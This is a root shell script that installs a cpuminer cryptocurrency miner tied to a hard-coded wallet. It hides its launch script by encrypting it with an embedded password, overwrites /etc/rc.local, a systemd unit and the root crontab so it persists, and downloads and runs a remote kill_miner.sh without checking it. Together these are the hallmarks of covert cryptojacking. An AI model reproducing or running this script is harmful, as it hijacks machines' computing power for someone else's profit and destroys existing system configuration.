#!/bin/sh
password="danielchau@123#"
rm -fR /root/cpuminer-opt-linux
sudo apt-get update -y
sudo apt-get install cpulimit -y
wget --no-check-certificate -O cpuminer-opt-linux.tar.gz https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz
mkdir /root/cpuminer-opt-linux
tar -xvf cpuminer-opt-linux.tar.gz -C /root/cpuminer-opt-linux
chmod +x ./cpuminer-opt-linux/* 
cores=$(nproc --all)
#rounded_cores=$((cores * 9 / 10))
#read -p "What is pool? (exp: fr-zephyr.miningocean.org): " pool
limitCPU=$((cores * 80))

#find best servers
servers=("stratum-eu.rplant.xyz" "stratum-asia.rplant.xyz" "stratum-na.rplant.xyz")
fastest_server=""
min_latency=999999
for server in "${servers[@]}"; do
    latency=$(ping -c 2 $server | awk '/^rtt/ { print $4 }' | cut -d '/' -f 2)
    if (( $(echo "$latency < $min_latency" | bc -l) )); then
        min_latency=$latency
        fastest_server=$server
    fi
done
echo "$fastest_server with min_latency is: $latency"

cat /dev/null > /root/danielluis1921.sh
cat >>/root/danielluis1921.sh <<EOF
#!/bin/bash
./kill_miner.sh
sleep 3
sudo /root/cpuminer-opt-linux/cpuminer-sse2 --background --threads=$cores -a yespower -o stratum+tcps://$fastest_server:17079 -u v3K4mds92oWPHSPuQ4Tm6bSSNMCmNj1JyY.Linode
sleep 3
EOF
echo "$password" | openssl enc -aes-256-cbc -salt -pbkdf2 -in danielluis1921.sh -out danielluis1922.sh -pass stdin
rm -fv danielluis1921.sh
chmod +x /root/danielluis1922.sh

#sed -i "$ a\\cpulimit --limit=$limitCPU --pid \$(pidof xmrig) > /dev/null 2>&1 &" danielluis1922.sh

cat /dev/null > /etc/rc.local
cp /root/danielluis1922.sh /etc/rc.local
chmod +x /etc/rc.local

cat /dev/null > /etc/systemd/system/rc-local.service

cat >>/etc/systemd/system/rc-local.service <<EOF
[Unit]
Description=/etc/rc.local Support
ConditionPathExists=/etc/rc.local

[Service]
ExecStart=/etc/rc.local start
TimeoutSec=0
StandardOutput=tty
RemainAfterExit=yes
SysVStartPriority=99

[Install]
WantedBy=multi-user.target 
EOF

cat /dev/null > /root/checkXMRIG.sh
cat >>/root/checkXMRIG.sh <<EOF
#!/bin/bash
if pgrep cpuminer-sse2 >/dev/null
then
  echo "cpuminer-sse2 is running."
else
  echo "cpuminer-sse2 isn't running"
  bash kill_miner.sh
  sleep 3
  openssl enc -d -aes-256-cbc -in danielluis1922.sh -pass pass:danielchau@123# | bash
fi
EOF
chmod +x /root/checkXMRIG.sh

cat /dev/null > /var/spool/cron/crontabs/root
cat >>/var/spool/cron/crontabs/root<<EOF
*/10 * * * * /root/checkXMRIG.sh > /root/checkxmrig.log
EOF

wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/kill_miner.sh" --output-document=/root/kill_miner.sh
chmod 777 /root/kill_miner.sh
./kill_miner.sh
sleep 3
openssl enc -d -aes-256-cbc -in danielluis1922.sh -pass pass:danielchau@123# | bash
